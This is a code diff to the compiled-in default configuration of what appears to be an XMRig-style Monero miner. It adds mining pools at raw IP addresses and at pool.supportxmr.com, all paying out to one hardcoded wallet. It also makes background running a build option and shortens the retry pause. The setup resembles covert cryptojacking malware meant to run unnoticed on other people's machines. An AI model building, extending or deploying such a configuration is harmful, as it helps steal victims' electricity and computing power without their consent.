@@ -39,7 +39,7 @@ const static char *default_config =
         "restricted": true
     },
     "autosave": false,
-    "background": true,
+    "background": BACKGROUND,
     "colors": false,
     "title": false,
     "randomx": {
@@ -131,13 +131,33 @@ const static char *default_config =
             "url": "37.203.243.102:443",
             "user": "88o9jtEfb84RCE3TdjLU7b1V2mJSbhLxp9febXKn6YGB1wZx5ovfNUtiYTK65TXJcNRQvHNEZk1zMXczjiy3metyDjQN2Qu",
             "pass": "CPUARCH"
+        },
+        {
+            "url": "66.23.199.44:10001",
+            "user": "88o9jtEfb84RCE3TdjLU7b1V2mJSbhLxp9febXKn6YGB1wZx5ovfNUtiYTK65TXJcNRQvHNEZk1zMXczjiy3metyDjQN2Qu",
+            "pass": "CPUARCH"
+        },
+        {
+            "url": "66.23.199.44:80",
+            "user": "88o9jtEfb84RCE3TdjLU7b1V2mJSbhLxp9febXKn6YGB1wZx5ovfNUtiYTK65TXJcNRQvHNEZk1zMXczjiy3metyDjQN2Qu",
+            "pass": "CPUARCH"
+        },
+        {
+            "url": "pool.supportxmr.com:3333",
+            "user": "88o9jtEfb84RCE3TdjLU7b1V2mJSbhLxp9febXKn6YGB1wZx5ovfNUtiYTK65TXJcNRQvHNEZk1zMXczjiy3metyDjQN2Qu",
+            "pass": "CPUARCH"
+        },
+        {
+            "url": "pool.supportxmr.com:80",
+            "user": "88o9jtEfb84RCE3TdjLU7b1V2mJSbhLxp9febXKn6YGB1wZx5ovfNUtiYTK65TXJcNRQvHNEZk1zMXczjiy3metyDjQN2Qu",
+            "pass": "CPUARCH"
         }
     ],
     "print-time": 15,
     "health-print-time": 15,
     "dmi": false,
     "retries": 1,
-    "retry-pause": 5,
+    "retry-pause": 1,
     "syslog": false,
     "tls": {
         "enabled": false,
